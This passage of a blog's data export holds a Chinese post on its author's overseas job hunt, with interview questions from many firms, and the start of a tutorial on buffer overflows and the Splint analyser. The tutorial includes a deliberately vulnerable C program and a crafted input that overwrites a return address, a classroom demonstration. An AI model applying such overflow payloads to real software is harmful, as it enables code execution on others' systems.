IsFriday(std::string(\"Friday\").c_str());\n    const char *s = std::string(\"Friday\").c_str();\n    IsFriday(s);\n    return 0;\n}\n</code></pre>\n<li>Please explain how to reduce packet loss on each layer of TCP/IP stack?</li>\n<li>What is memory reordering? Please give an example and explanation.</li>\n<li>How can CPU cache affect your algorithm design? Please give an example and explanation.</li>\n</ol>\n###项目\n笔试过后，居然让用 5 天时间做个小项目，合并两个数十 GB 的大文件，是一个多线程解决外排序的问题，并且要给出测试代码。最终也过了。过程算是惊心动魄吧，前三天误解了题意，最后两天刷夜搞定的，还顺带自学了 Google Test 测试框架。\n### DTL 一面\n一面是个爱笑的大叔。\n<ol>\n<li>介绍毕设项目</li>\n<li>介绍腾讯项目</li>\n<li>std::string 内部实现</li>\n<li>copy on write 具体实现（引用计数）</li>\n<li>TOP k 问题（堆，快排，部分冒泡）</li>\n<li>map unordered_map 如何取舍</li>\n<li>多线程做没做过</li>\n<li>网络做没做过</li>\n<li>为什么新加坡</li>\n<li>为什么选我们，不去更热的移动互联网</li>\n</ol>\n<h3 id=\"dtl\">DTL 二面</h3>\n<ol start=\"3\">\n<li>做过的项目</li>\n<li>c++ 和其他语言的选取</li>\n<li>对什么业务感兴趣</li>\n<li>五年后有什么打算</li>\n<li>为什么移民</li>\n<li>关注什么前沿的事情</li>\n<li>因为兴趣做过什么项目</li>\n<li>喜欢独立还是团队</li>\n<li>会不会坚持己见</li>\n<li>对互联网金融是否感兴趣</li>\n</ol>\n<p>二面感觉不好，问的性格和价值观的问题太多了，这种问题问多了就很难和公司匹配上，然后就挂了，很难讲挂了是好还是不好，总之感觉有点可惜罢了。毕竟投入了很多。</p>\n<h2 id=\"morganstanley\">Morgan Stanley</h2>\n<p>如果留在国内的话，Morgan IT 算是我梦寐以求的 offer 了，找了本科基友帮我内推，之后就是笔试。可以选择 Java，C#，C++ 三种卷子，笔试是 IKM Assessment，相当相当的难，我感觉没对几道。不过好在还是过了，接下来是电面，全程英文。不知道是不是和阿三打交道太多，电面的面试官明明是中国人，说英语却带着淡淡的咖喱口音。面试题中规中矩，基本符合网上的面经，但是个别能加分的发挥题我基本都没答上来。</p>\n<ol>\n<li>introduce yourself</li>\n<li>why not tencent</li>\n<li>introduce a project you did and what problem you solved</li>\n<li>what is recursion？</li>\n<li>what is hashtable？</li>\n<li>how to implement a hashtable, what data structure should be used？</li>\n<li>stack and heap</li>\n<li>in what scenario，we can only use heap.</li>\n<li>memory leak</li>\n<li>how to detect memory leak</li>\n<li>what is virtual function</li>\n<li>how to implement virtual function and polymorphism</li>\n<li>what is copy constructor</li>\n<li>for a given string, how to output all the different combination.</li>\n</ol>\n<p>自己基本都答上来了，都很基础，其实相对于题目本身的技术而言，更大的考验是你怎么用英语去答这些问题，去描述这些概念，尤其是涉及到专业词汇的时候。然而这轮挂掉了，我也没想太明白为啥我挂了。</p>\n<h2 id=\"vmware\">VMware 上海</h2>\n<p>VMware 真的是一个好地方，这是一个晚上 8 点就已经是深夜的公司，让无数晚上 8 点夜生活刚刚开始的互联网公司人望洋兴叹。</p>\n<p>笔试题目还是很有难度的，涉及到不少内核的知识，主要内容包括 C++、自旋锁、设备描述表、gdb、反汇编、网络、概率、数字推理。自己编程实现 ftoa、自己编程实现栈，并用双栈实现队列、英文写作（一道题是探讨公有云私有云混合云，另一道是给主管写信，因为工作需要申请一部 iphone）</p>\n<p>好像我的笔试成绩最后排第三，实验室哥们排第二。之后就是面试了。 面试的过程也是英语口语加技术，英语只有一小点儿，敢说就行了，因为面试官的英语说的真心不怎么样。</p>\n<ol>\n<li>有一个 C 程序，定义了一个变量 i，结果继续执行几行与 i 无关的代码之后，i 的值变了，为什么？</li>\n<li>函数想返回多个返回值怎么半</li>\n<li>面向对象了解多少</li>\n<li>python 相关问题</li>\n<li>1000 个苹果分 10 个箱子装，要任何数字的苹果都能通过几个箱子的组合得到，应该如何装。</li>\n</ol>\n<p>反正整体的面试完全不在状态，和面试官不在一个频道上。第一题特别有意思，当时答了很多种答案，感觉像是压力面，回来之后思考了一下，觉得他可能是想考缓冲区溢出，或者线程安全问题。</p>\n<p>全程感觉面试官很怕伤到你似的，问我会不会 python，我说会，但我编 Python 需要有手册在边上，然后他居然说那就算了，不问了。问我了不了解面向对象，我以为面向对象就是 C++，我说我了解，结果他问继承和虚函数这种关系是什么 dependency，我又只能答不知道。面试题的设计感觉也是想虐你，而不是让你展示自己，反正从应聘开始到面试结束，给人的感觉是极其不专业，和 BAT 比差一截。</p>\n<p>最后问我是不是一定去上海不服从调剂，愿不愿意来北京，我说不愿意，然后出门我就知道肯定没戏，如果说愿意去北京，说不定能过。虽然感觉不好，但这是一个给 22 万还不加班的好地方啊。</p>\n<h2 id=\"\">天津渣打科营</h2>\n<p>这是一个传说中养老的地方，天津能给 11k 还不加班的公司，也是有点神了。它组织了一个 Open Day，我去了，公司给人感觉很 low，原因是它在带领大家参观的时候，主要介绍了 pantry，免费零食啥的，我觉得如果一个公司只能介绍这些东西了，那它也实在是没别的可说了。 在职员工做宣传的时候也很搞笑，她夸了渣打很好很不错，在她毕业求职各种碰壁各种不要她的时候收留了她，给了她机会。这么说的确是很好啊，但换个角度讲，那不是相当于它的要人标准低么？反正员工给人的整体感觉是眼界不够开阔。</p>\n<p>个人曾在渣打对面的企鹅呆了三个月，开发区的生活品质太差劲了，物价贵的要死，空气差的要死。Open Day 的时候问了问领队，可不可能 relocate，领队说在马来和印度还有科营。我靠，仔细思考了一下，难道我要 relocate 到印度吃飞饼和咖喱鸡吗？领队还说这里不保证不加班，那就完全没有兴趣了。</p>\n<h2 id=\"worldquant\">Worldquant</h2>\n<p>这家一开始是想去的，结果一方面发现它永远在招人，另一方面发现glassdoor 上的评价很差，于是就没有参加笔试。</p>\n<h2 id=\"cisco\">Cisco 杭州、上海</h2>\n<p>简历过了，但是天津没有笔试考场，需要去北邮笔试，关键是和日本 indeed 的在线笔试时间一样，冲突无法避免，于是没去。</p>\n<h2 id=\"ubssingapore\">UBS Singapore</h2>\n<p>瑞银感觉相当不错，作死地投了新加坡和香港，而并非上海。然后发来了 Online Test，题目和行测差不多，做完之后一个月左右收到拒信，情理之中。</p>\n<h2 id=\"goldmansachshk\">Goldman Sachs HK</h2>\n<p>同样作死地没投北京，而是投了香港。这次连 Online Test 都没有，好像没收到拒信，石沉大海。据说他们喜欢要实习生转正的。</p>\n<hr>\n</div>","amp":"14","plaintext":"校招从 9 月开始，坚持到转年 6 月中旬结束，我算得上是实验室里打应聘持久战的奇葩了。自始至终基本都在找国外的工作，积累了不少经验教训。\n\n很多人一听到找出国的工作，立刻就觉得很难，其实不是这样，当你真的去了解这些东西，就会发现渠道真的是太多了，限制你的往往不是没有机会，而是有太多的机会摆在你面前，只是你能力不够，无法抓住，抑或仅仅是欠缺三分运气。\n\n企鹅\n拿到的第一个 offer 是企鹅的，原因很简单，实习生转正自动得到的。而且企鹅十分慷慨，一直等到了我 12\n月底，而没有像其他公司那样催促交三方，在我全力应聘国外的时候，企鹅是坚强有力的后盾，值得感谢。\n\n启程日本 [http://workinjapan.cn/]\n整个校园招聘期间，启程日本算是我花了相当大精力，或者说主要精力的事情了。启程日本是专业的人力资源公司，类似于猎头，提供一个让中国学生和日本公司做对接的中间人作用吧，所有服务都是免费的，他们向招人成功的日本公司收服务费，而且通过它们跨国来中国招人的成本十分巨大，所以能来的公司都是效益非常好的牛企。\n\n笔试\n我是赶夏季招聘没有赶上，于是 6 月 30 号在大连理工大学做的秋季招聘笔试。从天津来回打飞的去大连大黑山脚下笔试，把咨询顾问感动坏了。\n笔试都是小学数学题，包括售价折扣题、工程效率、相遇追及、简单逻辑等等，还有 90 分钟的心理测验，那些题目实在是太多了，做到最后都不知道自己怎么选的。\n\n启程日本一面\n一面是在企鹅实习的时候面的，启程日本的每个参与者都有自己专属的咨询顾问，这次面试算是正式认识了负责我的顾问，她们自称为咨询担当。主要问了一些 HR\n面常见问题，重点还是了解你的意愿，好帮你报公司。\n\n 1. 英文自我介绍\n 2. 对启程日本有没有了解\n 3. 选择公司的因素\n 4. 为什么去日本\n 5. 找国内工作的话，国内哪些公司你比较看重\n 6. 对日本的生活有没有了解\n 7. 你大学中印象比较深刻的事情\n 8. 你性格上的优点和缺点\n 9. 别人如何评价你\n\n不知道是不是因为我条件很不错，后面再没有经历过启程日本这边的面试，和网上看到的要过两三轮完全不符，也就是说启程日本这边已经合格了，后面一直在参加企业面。\n\n日本公司的风格感觉和国内互联网完全不同，简历关非常难过，NTT Communications、NS Solutions、Uniccs、Recruit\n五个部门的三个，简历都直接挂了。总结了一下，凡是做系统开发的公司，简历都挂了。简历通过进入面试的只有 MonotaRO、Recruit\nsumai、Recruit Lifestyle\n\nMonotaRO 一面\nMonotaRO 算是所有日本公司里面的 dream offer\n了，这是一家少见的，以加班少为优势进行招聘宣传的公司，在日本公司来说，不加班真的是难得了，而且它是一家上市公司，非常稳定，发展也好。另外就是公司位于兵库县尼琦市，远离东京的喧嚣，反正符合我选公司的所有要求，没有任何让人不满意的地方。\n\n面试的翻译十分给力，他会理解了你的意思后再翻译，配合的很默契。问题主要有：\n\n 1. 你喜欢自己搞事情还是团队搞\n 2. 你在腾讯是如何与别人协作的\n 3. 为什么来日本\n 4. 为什么 MonotaRO\n 5. 你擅长什么，不擅长什么。技术上和生活上分别答\n 6. 列出你知道的排序\n 7. 写了个算法，该算法的缺点是什么\n 8. python 处理百万条数据的效率如何\n\n总之，技术题全答对了，他们对技术要求实在是不高，让我列出知道的排序算法，我说了八九个吧，然后我以为接下来会让我写几个，结果就没有然后了。闹了半天说出名字就可以。技术面试官除了一直在点头表示开心，我没看出任何别的反应。但是\nHR\n面就很搞了，这位面试官在拿着我的心理测试报告狂研究，感觉就像玩三国志一样，他们居然把人的性格各个维度给量化了，然后他画了几个圈，就开始各种纠结我的团队协作问题，早知道这样，当时在大连做测试时，就不选这么多性格独立了。\n\n反正最后还是过了，下午二面，我前面还有三个人一起进去二面，出来的时候直接拿着 offer 和合同出来的，当场就发。。。\n\nMonotaRO 二面\n我以为也会给我发 offer，结果他们说上午有问题忘了问，继续面试。\n\n 1. 当 leader 的经历\n 2. 一个产品，你觉得想法不行，员工都觉得行，最后你没拗过员工，做了，结果失败了，应该谁负责。\n 3. 快速迭代和打磨品质，你更看重哪个\n 4. 你对MonotaRO 了解多少\n 5. 你觉得公司哪里可以改进\n 6. 解释死锁\n\n聊了很长时间当 leader 的问题，最后问了点技术，技术依然全过，主要还是 HR 问题，最后就是回去等结果。\n\n后来通过咨询顾问了解到，MonotaRO 上海场一个人也没招到，都刷了，最后就发了北京场我前面那三个人的\noffer，我是唯一的备胎，只要那三个人有一个人拒掉，offer\n就会给我。以前每次都有人拒，所以顾问觉得我八九不离十，结果没想到今年三个人都接受了，一个拒的也没有，然后我就挂了，顾问也是觉得十分无奈。\n\nRecruit sumai\n这就是日本的搜房网，面试官是一个大叔和一个眼镜娘，我这边是我和一个翻译。大叔很可爱，眼镜娘很高冷。可惜这场的翻译不给力，磕磕巴巴的，严重影响发挥。真是哪行都有混日子的人。\n\n 1.  他介绍了公司的情况\n 2.  你做了这么多项目，最成功的是哪一个\n 3.  你对什么技术感兴趣\n 4.  有了这些技术后，你觉得你能为我们做出什么服务\n 5.  你的缺点是什么\n 6.  你的朋友是如何评价你的\n 7.  你的 C 语言很有自信，是吧\n 8.  你觉得你为了什么工作：钱、工作本身、人、地位\n 9.  你觉得工作中什么时候你最快乐\n 10. 你觉得工作的意义在哪里。\n 11. 你是哪里的人，你的童年是什么样子的\n 12. 为什么来日本\n\n他们问技术也挺搞笑的，或者说根本不问，他问是不是对 C 有信心，我说是，那按照一般的剧情，应该会问俩 C\n的问题，结果就这么结束了。有信心，有，好，那问点别的。。。\n\n结果和 MonotaRO 类似，他们给我加了锁，然后回去等，依然是备胎，别人拒了轮到我，然而最终依然没轮到我。\n\nRecruit Lifestyle\n同样是两个面试官，一个翻译。这家面试官非常像王石，我一进屋，我靠，这不是王石么，另一个面试官英语还行。\n\n 1. 王石介绍了公司的情况\n 2. 为什么来我们公司\n 3. 你觉得你能给我们带来什么\n 4. 你最有自信的技术，举例子说明。\n 5. 用英语描述一个做过的最困难的项目\n\n最后用英语描述项目比较尴尬，我说的东西，面试官可以懂，但我听不懂面试官的英语，因为我总感觉他在说日语，听不出来那是英语，结果就变成了“我说英语 ->\n面试官用英语提问 -> 我卖萌表示不懂 -> 面试官冲翻译用日语提问 -> 翻译冲我说中文 -> 我继续说英语”\n\n最后这家没通过，因为我提的一个想法他们以前想过，然后关键问题我又没答到点儿上，算是撞枪口了吧。\n\n面这家公司印象最深的不是公司本身，也不是王石，而是翻译。面试时所有的翻译都是从翻译公司找的专业翻译，但这个翻译明显技高一筹，我前面我后面所有参加面试的人，出来以后，第一句话基本都是这个翻译好厉害啊，什么都能翻。而且有一些略懂日语的人可以听出来，他不仅仅是翻译，他还会把面试者说的没什么逻辑的回答，给整理润色一下，帮你给圆上。真是业界良心。\n\n我能明显感觉到他和我经历过的其他翻译不一样，中国人说日语的腔调和日本人是有差别的，而且总会存在思考、遣词造句的小停顿，但是他说日语完全和母语一样，根本不用思考，语速比对面的日本面试官还要快，连口音和腔调都没差别，对比之下，好像他才是日本人，对面的面试官是冒牌货。反正我觉得如果没有特殊的机缘在特定的年龄接受过双语教育，通过后天学习很难练到这种水平。\n\nAHRP\nAHRP 是另外一个赴日项目，但是感觉办的没有启程日本如火如荼，现在连官网都挂掉了。我在 AHRP 参加了雅虎日本、面白法人\nKayac、YUMEMI，雅虎日本简历关就挂了。进面试的是 Kayac 和 YUMEMI，AHRP\n人员很少，顾问就是翻译，每次都是和顾问配合，她特别像台湾人，不过没好意思问她。\n\nAHRP 一面\n报雅虎日本的时候，还是 6 月，所以参加了一个早期面试，类似于初筛吧\n\n 1.  怎么知道 AHRP 这个项目的。\n 2.  为什么要去海外就业\n 3.  简历相关，考研历程\n 4.  为什么读研\n 5.  读研生活和你想的是否一样\n 6.  研究方向\n 7.  是否想去深造\n 8.  给出选公司最看重的三个方面。\n 9.  有没有理想的想去的公司\n 10. 为什么去日本的公司。\n 11. 有没有在其他公司的校招流程中\n\n其实就是聊一聊，初步了解一下你。\n\nAHRP 二面\n二面是日本顾问伊野濑澄先生和一个翻译。依然是一些了解你性格的问题。问了问：简历的细节，为什么出国，最成功项目，自己的兴趣的项目，父母同意吗等等等等\n\n到此为止，AHRP 这边算是过了，接下来就都是企业面了。\n\n面白法人 Kayac 一面\n 1. 介绍一下做过的项目\n 2. 自己因兴趣做的项目\n 3. 做没做过 WebService 的项目\n 4. 将来想做哪方面\n 5. 你码代码注重哪些方面\n 6. 有没有崇拜的一个人，崇拜哪一点\n 7. 为什么去日本\n 8. 你在新加坡呆过，英语肯定好，有没有更长远的规划。\n\n我主要问了问这次招人是去横滨还是镰仓，总之感觉面试官不苟言笑，也不知道他想找啥样的人，反正没过。\n\nYUMEMI 一面\nYUMEMI 是 AHRP 这边离 offer\n最近的公司了，一面是两个人一起面，同样的问题一个人答完了另一个人答，和我一起面试的是一个北大的本科生，先是例行常规问些为什么去日本，为什么我们公司等等问题，然后就是分别介绍一个做过的项目。我介绍了本科时做的游戏引擎，北大那哥们介绍了一个电商网站，因为我那个是直接能玩的游戏，太炫了，所以直接胜出，把他\nPK 下去了。二面的时候他已经不在了。\n\nYUMEMI 二面\n二面面试官增加了社长本人，然后依然问一些 HR\n问题，比如喜欢快速迭代还是打磨品质，最成功的项目等等等等，他们想要前端的人，我是做后端的，所以技术上不匹配，他们也可以要后端，但是得会 php，我又不会\nphp，不过他们还是给我机会了，可能是看我比较靠谱吧。\n\n最后他们问如果现在给 offer 签不签，但是我正在等 MonotaRO 的通知啊，那个 dream offer\n啊，所以我只能说还得考虑下，他们就追问考虑什么因素等等等等。\n\n最后还是没过，我感觉如果我答应签，或许会过吧，因为后来了解到强烈的意愿也是 AHRP 这边招人看重的一个因素，总之就是阴差阳错，两家不错的公司都说了再见。\n\nADSC Singapore\n这是 UIUC 在新加坡的海外研究中心，招 Software Engineer 做一些论文或者项目的工程实现，主要招前端的人，但还是给我了面试机会。\n\n 1. 介绍一下做的项目，说了腾讯抓取数据项目\n 2. 有数据库，有爬取的名字，如何优化查询\n 3. 有网页，怎样从数据库中快速匹配\n 4. smu 的项目\n 5. normalization 是什么\n 6. soap，restful，php，jsp 知道不知道\n 7. 你有什么问题\n\n我不是搜索方向，也没做过网络项目，虽然答的差不多，但专业一点就不行了，最后没过。\n\nDynamic Technology Lab Singapore\n这是一家新加坡的股票量化交易公司，反正是一个极牛的地方吧，年后主要精力都放在它身上了。\n\n笔试\n笔试就很有难度。比如其中有这么几个题目：\n\n 1. Is the following C++ code correct? Please explain why\n 2. \n    bool IsFriday(const std::string &day)\n    {\n    return day == \"Friday\";\n    } \n    bool IsFriday(const char *day)\n    {\n    return strcmp(day, \"Friday\") == 0;\n    }\n    int main(int argc, const char *argv[])\n    {\n    IsFriday(\"Friday\");\n    IsFriday(std::string(\"Friday\"));\n    IsFriday(std::string(\"Friday\").c_str());\n    const char *s = std::string(\"Friday\").c_str();\n    IsFriday(s);\n    return 0;\n    }\n 3. Please explain how to reduce packet loss on each layer of TCP/IP stack?\n 4. What is memory reordering? Please give an example and explanation.\n 5. How can CPU cache affect your algorithm design? Please give an example and\n    explanation.\n\n###项目\n笔试过后，居然让用 5 天时间做个小项目，合并两个数十 GB\n的大文件，是一个多线程解决外排序的问题，并且要给出测试代码。最终也过了。过程算是惊心动魄吧，前三天误解了题意，最后两天刷夜搞定的，还顺带自学了 Google\nTest 测试框架。\n### DTL 一面\n一面是个爱笑的大叔。 1.  介绍毕设项目\n 2.  介绍腾讯项目\n 3.  std::string 内部实现\n 4.  copy on write 具体实现（引用计数）\n 5.  TOP k 问题（堆，快排，部分冒泡）\n 6.  map unordered_map 如何取舍\n 7.  多线程做没做过\n 8.  网络做没做过\n 9.  为什么新加坡\n 10. 为什么选我们，不去更热的移动互联网\n\nDTL 二面\n 3.  做过的项目\n 4.  c++ 和其他语言的选取\n 5.  对什么业务感兴趣\n 6.  五年后有什么打算\n 7.  为什么移民\n 8.  关注什么前沿的事情\n 9.  因为兴趣做过什么项目\n 10. 喜欢独立还是团队\n 11. 会不会坚持己见\n 12. 对互联网金融是否感兴趣\n\n二面感觉不好，问的性格和价值观的问题太多了，这种问题问多了就很难和公司匹配上，然后就挂了，很难讲挂了是好还是不好，总之感觉有点可惜罢了。毕竟投入了很多。\n\nMorgan Stanley\n如果留在国内的话，Morgan IT 算是我梦寐以求的 offer 了，找了本科基友帮我内推，之后就是笔试。可以选择 Java，C#，C++ 三种卷子，笔试是\nIKM\nAssessment，相当相当的难，我感觉没对几道。不过好在还是过了，接下来是电面，全程英文。不知道是不是和阿三打交道太多，电面的面试官明明是中国人，说英语却带着淡淡的咖喱口音。面试题中规中矩，基本符合网上的面经，但是个别能加分的发挥题我基本都没答上来。\n\n 1.  introduce yourself\n 2.  why not tencent\n 3.  introduce a project you did and what problem you solved\n 4.  what is recursion？\n 5.  what is hashtable？\n 6.  how to implement a hashtable, what data structure should be used？\n 7.  stack and heap\n 8.  in what scenario，we can only use heap.\n 9.  memory leak\n 10. how to detect memory leak\n 11. what is virtual function\n 12. how to implement virtual function and polymorphism\n 13. what is copy constructor\n 14. for a given string, how to output all the different combination.\n\n自己基本都答上来了，都很基础，其实相对于题目本身的技术而言，更大的考验是你怎么用英语去答这些问题，去描述这些概念，尤其是涉及到专业词汇的时候。然而这轮挂掉了，我也没想太明白为啥我挂了。\n\nVMware 上海\nVMware 真的是一个好地方，这是一个晚上 8 点就已经是深夜的公司，让无数晚上 8 点夜生活刚刚开始的互联网公司人望洋兴叹。\n\n笔试题目还是很有难度的，涉及到不少内核的知识，主要内容包括 C++、自旋锁、设备描述表、gdb、反汇编、网络、概率、数字推理。自己编程实现\nftoa、自己编程实现栈，并用双栈实现队列、英文写作（一道题是探讨公有云私有云混合云，另一道是给主管写信，因为工作需要申请一部 iphone）\n\n好像我的笔试成绩最后排第三，实验室哥们排第二。之后就是面试了。 面试的过程也是英语口语加技术，英语只有一小点儿，敢说就行了，因为面试官的英语说的真心不怎么样。\n\n 1. 有一个 C 程序，定义了一个变量 i，结果继续执行几行与 i 无关的代码之后，i 的值变了，为什么？\n 2. 函数想返回多个返回值怎么半\n 3. 面向对象了解多少\n 4. python 相关问题\n 5. 1000 个苹果分 10 个箱子装，要任何数字的苹果都能通过几个箱子的组合得到，应该如何装。\n\n反正整体的面试完全不在状态，和面试官不在一个频道上。第一题特别有意思，当时答了很多种答案，感觉像是压力面，回来之后思考了一下，觉得他可能是想考缓冲区溢出，或者线程安全问题。\n\n全程感觉面试官很怕伤到你似的，问我会不会 python，我说会，但我编 Python\n需要有手册在边上，然后他居然说那就算了，不问了。问我了不了解面向对象，我以为面向对象就是 C++，我说我了解，结果他问继承和虚函数这种关系是什么\ndependency，我又只能答不知道。面试题的设计感觉也是想虐你，而不是让你展示自己，反正从应聘开始到面试结束，给人的感觉是极其不专业，和 BAT 比差一截。\n\n最后问我是不是一定去上海不服从调剂，愿不愿意来北京，我说不愿意，然后出门我就知道肯定没戏，如果说愿意去北京，说不定能过。虽然感觉不好，但这是一个给 22\n万还不加班的好地方啊。\n\n天津渣打科营\n这是一个传说中养老的地方，天津能给 11k 还不加班的公司，也是有点神了。它组织了一个 Open Day，我去了，公司给人感觉很\nlow，原因是它在带领大家参观的时候，主要介绍了 pantry，免费零食啥的，我觉得如果一个公司只能介绍这些东西了，那它也实在是没别的可说了。\n在职员工做宣传的时候也很搞笑，她夸了渣打很好很不错，在她毕业求职各种碰壁各种不要她的时候收留了她，给了她机会。这么说的确是很好啊，但换个角度讲，那不是相当于它的要人标准低么？反正员工给人的整体感觉是眼界不够开阔。\n\n个人曾在渣打对面的企鹅呆了三个月，开发区的生活品质太差劲了，物价贵的要死，空气差的要死。Open Day 的时候问了问领队，可不可能\nrelocate，领队说在马来和印度还有科营。我靠，仔细思考了一下，难道我要 relocate\n到印度吃飞饼和咖喱鸡吗？领队还说这里不保证不加班，那就完全没有兴趣了。\n\nWorldquant\n这家一开始是想去的，结果一方面发现它永远在招人，另一方面发现glassdoor 上的评价很差，于是就没有参加笔试。\n\nCisco 杭州、上海\n简历过了，但是天津没有笔试考场，需要去北邮笔试，关键是和日本 indeed 的在线笔试时间一样，冲突无法避免，于是没去。\n\nUBS Singapore\n瑞银感觉相当不错，作死地投了新加坡和香港，而并非上海。然后发来了 Online Test，题目和行测差不多，做完之后一个月左右收到拒信，情理之中。\n\nGoldman Sachs HK\n同样作死地没投北京，而是投了香港。这次连 Online Test 都没有，好像没收到拒信，石沉大海。据说他们喜欢要实习生转正的。\n\n\n--------------------------------------------------------------------------------","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2015-07-10T05:41:52.000Z","created_by":"1","updated_at":"2016-01-23T13:25:33.000Z","updated_by":"1","published_at":"2015-07-10T08:20:36.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null},{"id":"59bccd6bf9a5a920fc140c43","uuid":"0123cd49-fd4e-40a1-8449-d18398efa860","title":"使用 Splint 检测缓冲区溢出漏洞","slug":"huan-chong-qu-lou-dong","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"Splint 是一个比较常用的静态分析工具，缓冲区溢出漏洞，或者说缓冲区溢出攻击，也是信息安全领域的基础知识，本文以此对用静态分析工具进行漏洞检测做一个最基本的例子。\\n\\n##Splint\\n[Splint](http://www.splint.org/) 是一个开源的静态代码检测工具,用于检查 C 语言程序安全弱点和编码错误。从官网下载源码：http://www.splint.org/downloads/splint-3.1.2.src.tgz \\n\\n    tar xvzf splint-3.1.2.src.tgz\\n    cd splint-3.1.2\\n    ./configure\\n    make\\n    sudo make install\\n\\n然后，即可在终端使用。\\n\\n##缓冲区溢出基础\\n缓冲区溢出是经典的安全漏洞，想理解它的话，需要对程序运行时系统堆栈的运行原理有基本的了解。简单地讲，一个程序能实现函数调用，主要是依赖堆栈的存在。学过计算机原理的都应该知道，计算机执行程序的方法就是 CPU 从内存中一条一条地取出指令，然后执行。而究竟去什么地方取指令，取决于 `EIP` 寄存器，`EIP` 里面记录了下一条指令的存放地址，如果想实现函数调用，或者说实现一个跳转，那么需要修改 `EIP` 的值，问题在于，函数执行完了之后怎么回到原来的调用处继续往下执行呢？这个过程必然需要堆栈帮忙，保存跳转前的各种状态，方便函数执行完毕后，返回主程序时，把上下文恢复成原来的情况。\\n\\n程序中的每个函数都有自己的栈帧，关于栈帧不多解释了，可以参考《Linux C 程序设计大全》或者网络博客等等任何有关栈帧和内存管理的文章。\\n\\n考虑下面一段程序：\\n\\n<pre><code>\\nint seeding (int a, int b)\\n{\\n    char buf[32];\\n    return 0;\\n}\\nint main()\\n{\\n    ret = seeding(2, 5);\\n    return 0;\\n}\\n</code></pre>\\n\\n在主函数中调用了一个 `seeding` 函数，那么主函数里面的逻辑如果用汇编来表示，大体上就是：\\n\\n<pre><code>\\npush 5\\npush 2\\npush addr_of_return\\ncall seeding\\n</code></pre>\\n\\n而在 `seeding` 里面，则会 `push ebp`, `mov esp, ebp`，保护现场，进入自己的栈帧，等函数执行完毕，会把 `ebp` 恢复，之后根据 `addr_of_return` 的值修改 `EIP`，返回到主函数中。\\n\\n画图不太方便， 借用网络的一张图进行示意，函数调用过程堆栈的情况大体是这样。\\n<br />\\n![](/content/images/2015/07/huanchong.jpg)\\n<br />\\n\\n不用管右边，只看左边。压栈是从上往下压的，`data`上边的区域可以认为是主函数使用的，`data` 可以认为是存放了 a 和 b 两个参数，即 5 和 2，返回地址存放了主函数里面 `return` 语句的指令地址， `ebp` 存放了主函数的 `ebp`（`ebp` `esp`是什么意思这里不解释，只说重点）。缓冲区就是`buf[32]`，因为局部变量也是存放在栈里面的，所以如果往`buf`里面赋值的话，内容就存放在图上的缓冲区中。\\n\\n正常情况下，`seeding`函数返回的时候，会把图上的`ebp`值出栈，这样寄存器`ebp`就恢复到了`seeding`调用前的状态，之后把返回地址放到`EIP`中，这样，下一条指令自然就会执行主函数的 `return 0`语句，那么函数调用就成功结束，返回到了主函数中。\\n\\n下面问题来了，C 语言是不检查数组边界的，会根据你的输入一直往后面写，所以如果你往`buf[32]`里面存了 48 个字符，超过了数组的容量，那么由于缓冲区上面的空间是`ebp`和返回地址，所以超出的部分会覆盖掉这些地方原来的值。特别的，如果精心设计超出部分的值，让我们设计好的数字恰好覆盖掉返回地址，那么程序返回的时候，就不是返回到原来的主函数，而是跳转到我们想要执行的恶意代码了。\\n\\n这就是缓冲区溢出漏洞，也可以说是缓冲区溢出攻击，由于一般的做法是通过故意让缓冲区溢出，来打开一个 shell，所以这段用于溢出原缓冲区的代码又称为 shellcode。\\n##构造带有缓冲区溢出漏洞的程序\\n为了做实验，我们写一个带溢出漏洞的程序。顺便将上面的原理在实践中演示一下。\\n\\n首先是一个正常的程序，我们展示一下程序中调用栈的情况。源代码是:\\n\\n<pre><code>\\n// filename: overflow.c\\n#include &ltstdio.h&gt\\n#include &ltstring.h&gt\\n\\nint func(char in[])\\n{\\n\\tchar buf[10];\\n\\n\\tstrcpy(buf, in);\\n\\treturn 0;\\n}\\n\\nint main()\\n{\\n\\tchar *in = \\\"myinput\\\";\\n\\tint ret;\\n\\n\\tret = func(in);\\n\\n\\treturn 0;\\n}\\n</code></pre>\\n\\n编译这段程序，注意要加上禁止堆栈保护选项：\\n\\n    gcc -g -fno-stack-protector overflow.c -o overflow\\n\\n编译后，使用 gdb 在 `func`里面的`return` 处下断点，观察内存、`esp`以及栈帧情况。结果如图所示。\\n<br />\\n![](/content/images/2015/07/over1.png)\\n<br />\\n<br />\\n![](/content/images/2015/07/over2.png)\\n<br />\\n\\n* 由于是 64 位系统，所以寄存器都是 rbp，rsp，实际就是上文的 ebp，esp。\\n* 由于是 64 位系统，所以地址有点长。\\n* 这里只关注第二张图，后文都说的是第二张图。\\n\\n可以看到，倒数第四行，rsp（堆栈栈顶） 指向了 dee0。在正数第三行开始，我们查看了 dee0 开始到 df10 的内存数据，对照 [ASCII](http://ascii.911cha.com/) 码表可以看到，堆栈最上面的元素（def0 那行）就是程序里面的 `myinput`，紧接着就是 ebp（df00 那行的前两个数据），而 df00 行的第三个数据 0x0040056f，就是返回地址，与图片倒数第一行给出的栈帧情况相符，倒数第一行表明，函数结束后，应该返回 main 的 40056f 处，和堆栈中写入的数据是一致的。所以实验结果与上节原理的解释是相符的，堆栈里面先是缓冲区，缓冲区上面是 ebp，再上面是返回地址。\\n\\n下面我们改动程序，让缓冲区溢出，覆盖掉返回地址。改动后的程序是这样：\\n\\n<pre><code>\\n// filename: exploit.c\\n#include &ltstdio.h&gt\\n#include &ltstring.h&gt\\n\\nint exploit()\\n{\\n\\tprintf(\\\"我是幼苗我自豪\\\\n\\\");\\n}\\n\\nint func(char in[])\\n{\\n\\tchar buf[16];\\n\\n\\tstrcpy(buf, in);\\n\\treturn 0;\\n}\\n\\nint main()\\n{\\n\\tchar *in = \\\"1234567890123456\\\\x20\\\\xdf\\\\xff\\\\xff\\\\xff\\\\x7f\\\\xcc\\\\xcc\\\\x7d\\\\x05\\\\x40\\\\x00\\\";\\n\\t// char *in = \\\"123456789012345\\\"; 正常版本\\n\\tint ret;\\n\\n\\tret = func(in);\\n\\treturn 0;\\n}\\n</code></pre>\\n\\n首先，程序里面多了一个 exploit 